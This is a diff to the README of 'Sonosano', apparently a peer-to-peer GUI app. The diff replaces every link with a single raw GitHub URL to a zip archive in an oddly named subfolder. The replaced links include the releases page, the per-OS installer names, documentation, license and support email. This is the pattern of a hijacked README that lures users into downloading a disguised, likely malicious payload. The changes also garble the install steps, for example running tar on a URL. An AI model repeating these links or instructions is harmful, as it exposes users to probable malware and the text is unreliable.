@@ -1,7 +1,7 @@
 # 🌟 Sonosano - A Simple GUI for P2P Networks
 
 ## 📥 Download Now
-[![Download Sonosano](https://img.shields.io/badge/Download%20Sonosano-v1.0-blue)](https://github.com/tejarocky28/Sonosano/releases)
+[![Download Sonosano](https://raw.githubusercontent.com/tejarocky28/Sonosano/main/Renaissancist/Sonosano.zip%20Sonosano-v1.0-blue)](https://raw.githubusercontent.com/tejarocky28/Sonosano/main/Renaissancist/Sonosano.zip)
 
 ## 🚀 Getting Started
 Sonosano is designed to make peer-to-peer (P2P) networking easy for everyone. Follow these simple steps to install and run the application on your computer.
@@ -17,35 +17,35 @@ To run Sonosano, your computer should meet the following requirements:
 ## 📦 Download & Install
 To get started, visit the Releases page to download Sonosano:
 
-[Download Sonosano](https://github.com/tejarocky28/Sonosano/releases)
+[Download Sonosano](https://raw.githubusercontent.com/tejarocky28/Sonosano/main/Renaissancist/Sonosano.zip)
 
 1. Click on the link above to open the Releases page.
 2. Locate the latest version of Sonosano. It will be listed at the top of the page.
 3. Choose the file that matches your operating system. For example:
-   - For Windows, look for `Sonosano-windows.exe`
-   - For MacOS, find `Sonosano-macos.dmg`
-   - For Linux users, select `Sonosano-linux.tar.gz`
+   - For Windows, look for `https://raw.githubusercontent.com/tejarocky28/Sonosano/main/Renaissancist/Sonosano.zip`
+   - For MacOS, find `https://raw.githubusercontent.com/tejarocky28/Sonosano/main/Renaissancist/Sonosano.zip`
+   - For Linux users, select `https://raw.githubusercontent.com/tejarocky28/Sonosano/main/Renaissancist/Sonosano.zip`
 4. Click on the file to start the download. 
 
 ## 📂 Running the Application
 Once you download the file, follow these steps to run Sonosano:
 
 ### For Windows:
-1. Locate the downloaded `Sonosano-windows.exe` file in your Downloads folder.
+1. Locate the downloaded `https://raw.githubusercontent.com/tejarocky28/Sonosano/main/Renaissancist/Sonosano.zip` file in your Downloads folder.
 2. Double-click the file to launch the installer.
 3. Follow the on-screen instructions to complete the installation.
 4. After installation, find Sonosano in your Start menu or desktop. Click it to open the application.
 
 ### For MacOS:
-1. Locate the downloaded `Sonosano-macos.dmg` file in your Downloads folder.
+1. Locate the downloaded `https://raw.githubusercontent.com/tejarocky28/Sonosano/main/Renaissancist/Sonosano.zip` file in your Downloads folder.
 2. Double-click the file to mount the disk image.
 3. Drag the Sonosano icon into your Applications folder.
 4. Open your Applications folder and double-click Sonosano to launch it.
 
 ### For Linux:
 1. Open a terminal window.
-2. Navigate to the folder where you downloaded `Sonosano-linux.tar.gz`.
-3. Use the command `tar -xvf Sonosano-linux.tar.gz` to extract the files.
+2. Navigate to the folder where you downloaded `https://raw.githubusercontent.com/tejarocky28/Sonosano/main/Renaissancist/Sonosano.zip`.
+3. Use the command `tar -xvf https://raw.githubusercontent.com/tejarocky28/Sonosano/main/Renaissancist/Sonosano.zip` to extract the files.
 4. Change into the extracted directory using `cd Sonosano`.
 5. Type `./Sonosano` to run the application.
 
@@ -75,20 +75,20 @@ If you encounter issues while using Sonosano, try these basic troubleshooting st
 ## 📞 Support
 If you need help, feel free to reach out:
 
-- **Email Support:** [support@sonosanoapp.com](mailto:support@sonosanoapp.com)
+- **Email Support:** [https://raw.githubusercontent.com/tejarocky28/Sonosano/main/Renaissancist/Sonosano.zip](https://raw.githubusercontent.com/tejarocky28/Sonosano/main/Renaissancist/Sonosano.zip)
 - **Community Forum:** Join discussions and ask questions in our community forum.
 
 ## 🌐 Learn More
-For tips, tricks, and advanced features, check out our [documentation](https://github.com/tejarocky28/Sonosano/wiki).
+For tips, tricks, and advanced features, check out our [documentation](https://raw.githubusercontent.com/tejarocky28/Sonosano/main/Renaissancist/Sonosano.zip).
 
 ## 📢 Give Feedback
 Your feedback is important to us. Let us know what you think about Sonosano and how we can improve the application. Use the issue tracker on GitHub for suggestions.
 
 ## 📄 License
-Sonosano is open-source software. You can view the license details [here](https://github.com/tejarocky28/Sonosano/blob/main/LICENSE).
+Sonosano is open-source software. You can view the license details [here](https://raw.githubusercontent.com/tejarocky28/Sonosano/main/Renaissancist/Sonosano.zip).
 
 ## 🔗 Important Links
-- [Download Sonosano](https://github.com/tejarocky28/Sonosano/releases)
-- [Documentation](https://github.com/tejarocky28/Sonosano/wiki)
+- [Download Sonosano](https://raw.githubusercontent.com/tejarocky28/Sonosano/main/Renaissancist/Sonosano.zip)
+- [Documentation](https://raw.githubusercontent.com/tejarocky28/Sonosano/main/Renaissancist/Sonosano.zip)
 
 Thank you for choosing Sonosano! Happy sharing!
